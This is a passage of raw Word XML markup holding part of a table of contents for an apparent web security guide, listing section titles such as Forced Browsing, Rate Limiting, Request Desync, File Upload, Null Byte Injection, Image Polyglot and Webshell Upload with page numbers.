                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A7BCD75" w14:textId="7EAB4696" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408565" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How Cracking is Done?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408565 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0A85EE87" w14:textId="5DC75565" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408566" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Forced Browsing</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408566 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4F1C6F88" w14:textId="517AE1A3" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408567" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Attackers Try To</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408567 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="10EFA0FB" w14:textId="1439568A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408568" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Approach</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408568 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="53FF783A" w14:textId="4D858ECE" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408569" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Rate Limiting</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408569 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0AB42802" w14:textId="60E89612" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408570" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tests</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408570 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3C6F8D86" w14:textId="777D2A8B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408571" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Implementations</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408571 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1E951B62" w14:textId="09AAB45E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408572" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Request Desync</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408572 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="59483FF0" w14:textId="565C5369" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408573" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>File Upload</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408573 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="43C9C303" w14:textId="183498B0" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408574" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Usage:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408574 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2E4B285A" w14:textId="020E79E9" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408575" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Workflow:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408575 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1457CB81" w14:textId="1E113A22" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408576" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerabilities:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408576 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0726E04B" w14:textId="2E2648AE" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408577" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Null Byte Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408577 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="79775B35" w14:textId="7247970E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408578" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How it works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408578 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="72F308C5" w14:textId="66997F11" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408579" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Image Polyglot</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408579 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="70A46BD1" w14:textId="5B700BDB" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408580" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Why Polyglot Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408580 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6EC933AC" w14:textId="7CB95F5E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408581" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Webshell Upload</w:t>
            </w:r>
            <w:r>
